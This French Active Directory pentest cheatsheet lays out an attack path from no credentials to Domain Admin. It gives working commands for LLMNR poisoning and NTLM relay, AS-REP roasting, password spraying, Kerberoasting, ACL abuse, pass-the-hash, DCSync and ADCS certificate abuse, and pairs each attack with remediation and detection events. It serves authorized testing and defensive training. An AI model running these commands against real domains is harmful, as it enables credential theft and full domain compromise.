# Cheatsheet — Attaques Active Directory

Chemin type d'un test interne : de « aucun identifiant » à « Domain Admin ». Chaque attaque est donnée **avec sa remédiation** — c'est ce qui distingue un responsable pentest.

> ⚠️ **Cadre.** Lab (GOAD, TryHackMe « Compromising AD ») ou mission autorisée par écrit uniquement. En interne réel : attention au **verrouillage de comptes** (spraying) et à ne rien casser. Tout tracé et horodaté.

**Variables** : `DC` = contrôleur de domaine · `DOMAINE` = FQDN (ex. `corp.local`) · `nxc` = NetExec.

---

## 1. Vue d'ensemble — le fil rouge

```
Aucun identifiant → LLMNR/NBT-NS + relais NTLM, AS-REP roasting, spraying
   ↓ un compte de domaine
Énumération (BloodHound) → Kerberoasting, abus d'ACL, chemins
   ↓ compte à privilèges / admin local
Mouvement latéral (PtH, PtT) → DCSync, ADCS
   ↓
Domain Admin / compromission de la forêt
```

---

## 2. Sans aucun identifiant

### LLMNR / NBT-NS poisoning + relais
```bash
sudo responder -I eth0            # capter des authentifications (hashes NTLMv2)
# hashes récupérés → hashcat -m 5600
```
Si la **signature SMB** n'est pas exigée, on **relaie** au lieu de casser :
```bash
nxc smb 10.0.0.0/24 --gen-relay-list targets.txt
# exemple: 
┌──(kali㉿kali)-[~]
└─$ nxc smb 192.168.56.0/24
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:None)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
# lecture
Forêt sevenkingdoms.local
│
├── Domaine parent : sevenkingdoms.local
│     └── DC : KINGSLANDING (192.168.56.10)
│
└── Domaine enfant : north.sevenkingdoms.local
      ├── DC : WINTERFELL   (192.168.56.11)
      └── Membre : CASTELBLACK (192.168.56.22)

sevenkingdoms est le domaine, KINGSLANDING est son contrôleur de domaine (la machine). Un domaine et son DC sont deux choses distinctes.

north n'est pas « dans » kingslanding, il est l'enfant du domaine sevenkingdoms. On parle d'un domaine parent et d'un sous-domaine, réunis dans une même forêt.

Dans north, WINTERFELL est le contrôleur de domaine (c'est lui qui porte l'annuaire north). CASTELBLACK n'est pas un DC : c'est une simple machine membre du domaine north.

Une bonne habitude pour la suite : distingue toujours « nom de domaine » (finit en .local, .lan…) et « nom de machine » (un hostname court, en majuscules ici). Dès que tu verras un hostname, demande-toi : DC ou simple membre ?
```


```bash
sudo responder -I eth0            # (désactiver SMB/HTTP dans Responder.conf)
impacket-ntlmrelayx -tf targets.txt -smb2support
```
> **Remédiation** : désactiver LLMNR **et** NBT-NS (GPO), exiger la signature SMB/LDAP.

### AS-REP roasting (comptes sans pré-authentification Kerberos)
```bash
# Sans identifiant, si on a une liste d'utilisateurs
impacket-GetNPUsers DOMAINE/ -usersfile users.txt -no-pass -dc-ip <DC>
# Avec un compte
nxc ldap <DC> -u user -p pass --asreproast asrep.txt
# Cassage
hashcat -m 18200 asrep.txt rockyou.txt
```
> **Remédiation** : activer la pré-authentification Kerberos sur tous les comptes (retirer `DONT_REQ_PREAUTH`).

### Password spraying
```bash
# UN mot de passe courant sur BEAUCOUP de comptes (évite le verrouillage)
nxc smb <DC> -u users.txt -p 'Automne2026!' --continue-on-success
# Vérifier la politique AVANT
nxc smb <DC> -u user -p pass --pass-pol
```
> **Remédiation** : MFA, politique de MDP robuste, seuil de verrouillage, détection des 4625 en rafale.

---

## 3. Énumération (avec un compte de domaine)

### BloodHound — les chemins d'attaque
```bash
# Collecte à distance
nxc ldap <DC> -u user -p pass --bloodhound --collection-method All --dns-server <DC>
# ou bloodhound-python
bloodhound-python -u user -p pass -d DOMAINE -ns <DC> -c All
# ou SharpHound.exe / .ps1 sur une machine Windows
```
Puis import dans l'UI BloodHound. Requêtes clés : *Shortest Path to Domain Admins*, *Kerberoastable users*, *AS-REP roastable*, *Find principals with DCSync rights*.

### Énumération complémentaire
```bash
nxc smb <DC> -u user -p pass --users --groups --pass-pol --rid-brute
ldapsearch -x -H ldap://<DC> -D 'user@DOMAINE' -w pass -b "dc=corp,dc=local"
# PowerView (Windows) : Get-DomainUser, Get-DomainGroup, Get-DomainComputer, Find-InterestingDomainAcl
```

---

## 4. Kerberoasting (comptes de service avec SPN)

```bash
impacket-GetUserSPNs DOMAINE/user:pass -dc-ip <DC> -request -outputfile kerb.txt
# ou
nxc ldap <DC> -u user -p pass --kerberoasting kerb.txt
# Cassage
hashcat -m 13100 kerb.txt rockyou.txt
```
Le TGS est chiffré avec le hash du compte de service → cassable hors ligne. Cibler les comptes de service membres de groupes à privilèges.

> **Remédiation** : mots de passe de service **longs et aléatoires** (25+), **gMSA** (rotation automatique), retirer les SPN inutiles, AES plutôt que RC4.

---

## 5. Abus d'ACL

Droits mal attribués repérés dans BloodHound (`GenericAll`, `GenericWrite`, `WriteDacl`, `ForceChangePassword`, `AddMember`…).

```bash
# Forcer le changement de MDP d'un utilisateur qu'on contrôle
net rpc password "cible" "NewPass123!" -U DOMAINE/user%pass -S <DC>
# S'ajouter à un groupe (droit AddMember)
bloodyAD -u user -p pass -d DOMAINE --host <DC> add groupMember "Groupe" user
# Abus complet via PowerView/Impacket selon le droit
```
> **Remédiation** : revue régulière des ACL, principe du moindre privilège, alerter sur les modifications d'appartenance aux groupes sensibles.

---

## 6. Mouvement latéral

### Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash
```bash
# PtH : rejouer un hash NTLM
nxc smb 10.0.0.0/24 -u Administrateur -H <NTLM>        # où suis-je admin ?
impacket-wmiexec -hashes :<NTLM> Administrateur@10.0.0.10

# PtT : injecter un ticket Kerberos (.ccache / .kirbi)
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAINE/user@cible

# Overpass-the-hash : hash → TGT
impacket-getTGT DOMAINE/user -hashes :<NTLM>
```
> **Remédiation** : **tiering** administratif, **LAPS** (MDP admin local unique par poste), Protected Users, désactiver NTLM là où possible, Credential Guard.

---

## 7. DCSync (imiter un DC pour extraire les secrets)

Nécessite les droits de réplication (`DS-Replication-Get-Changes*`) — souvent Domain Admin, ou un compte mal doté (à repérer dans BloodHound).

```bash
impacket-secretsdump DOMAINE/user:pass@<DC>            # tous les secrets
impacket-secretsdump DOMAINE/user:pass@<DC> -just-dc-user krbtgt
nxc smb <DC> -u user -p pass --ntds                    # dump NTDS
```
Le hash **krbtgt** → **Golden Ticket** (persistance totale, voir §9).

> **Remédiation** : restreindre les droits de réplication aux seuls DC, surveiller l'event **4662** de réplication depuis un hôte non-DC.

---

## 8. ADCS — abus de certificats (ESC1 → ESC8)

```bash
# Recensement des modèles vulnérables
certipy find -u user@DOMAINE -p pass -dc-ip <DC> -vulnerable -stdout
# Exemple ESC1 : demander un certif au nom d'un admin
certipy req -u user@DOMAINE -p pass -ca <CA> -template <Vuln> -upn Administrateur@DOMAINE
# Auth avec le certif → TGT / hash NT
certipy auth -pfx administrateur.pfx -dc-ip <DC>
```
> **Remédiation** : durcir les modèles de certificats (pas d'`ENROLLEE_SUPPLIES_SUBJECT` sans validation), restreindre les droits d'inscription, activer l'approbation du gestionnaire, retirer l'EKU d'authentification inutile.

---

## 9. Persistance (lab / démonstration — à nettoyer)

| Technique | Idée |
| --- | --- |
| **Golden Ticket** | TGT forgé avec le hash krbtgt → n'importe quel accès, longtemps |
| **Silver Ticket** | TGS forgé pour un service précis (plus discret) |
| **DCShadow** | Enregistrer un faux DC pour écrire dans l'AD |
| **AdminSDHolder / ACL** | Droits cachés reconduits automatiquement |

> Tout mécanisme de persistance posé en mission est **documenté et retiré** ; le rapport le confirme. `krbtgt` compromis → **double rotation** du mot de passe krbtgt en remédiation.

---

## 10. Côté Blue Team — traces principales

| Attaque | Trace / Event |
| --- | --- |
| Kerberoasting | **4769** avec chiffrement **RC4** (0x17), volume anormal de TGS |
| AS-REP roasting | **4768** sans pré-auth, type de chiffrement faible |
| Password spraying | **4625** en rafale sur beaucoup de comptes, même source |
| Pass-the-Hash | **4624** type 3, NTLM là où Kerberos est attendu |
| DCSync | **4662** (accès à l'objet domaine, GUID de réplication) depuis un non-DC |
| Relais NTLM / Responder | LLMNR/NBT-NS anormaux, authentifications croisées |
| Golden/Silver Ticket | TGS sans TGT préalable, durées de vie aberrantes |

**Outils défense** : règles Sigma, Wazuh/Elastic, **PingCastle**/**ORADAD** pour l'état de durcissement, guides **ANSSI AD**.

---

## 11. Durcissement AD — la synthèse « ton RSSI »

1. **Tiering** administratif (Tier 0/1/2) — le point le plus structurant.
2. **LAPS** — MDP admin local unique par poste.
3. Désactiver **LLMNR/NBT-NS**, exiger **signature SMB/LDAP**.
4. **gMSA** pour les comptes de service, pré-auth Kerberos partout, AES.
5. **Protected Users**, Credential Guard, restreindre/désactiver NTLM.
6. Revue régulière des **ACL** et des droits de réplication.
7. Durcir **ADCS**. Surveiller 4662/4769/4625.
8. Audit périodique **PingCastle**.

---

## 12. À savoir expliquer à l'oral (module 5)

- **Compromettre un domaine sans identifiant** : LLMNR/relais ou AS-REP → un compte → BloodHound → Kerberoasting/ACL → latéral → DCSync. Et **comment l'empêcher** à chaque étape.
- **Kerberoasting** en une phrase + remédiation (gMSA, MDP longs).
- **Lire un chemin BloodHound** : nœuds, arêtes (droits), plus court chemin vers DA.
- **Pourquoi le tiering et LAPS** cassent le mouvement latéral.
- **krbtgt** : pourquoi la double rotation, et ce qu'est un Golden Ticket.
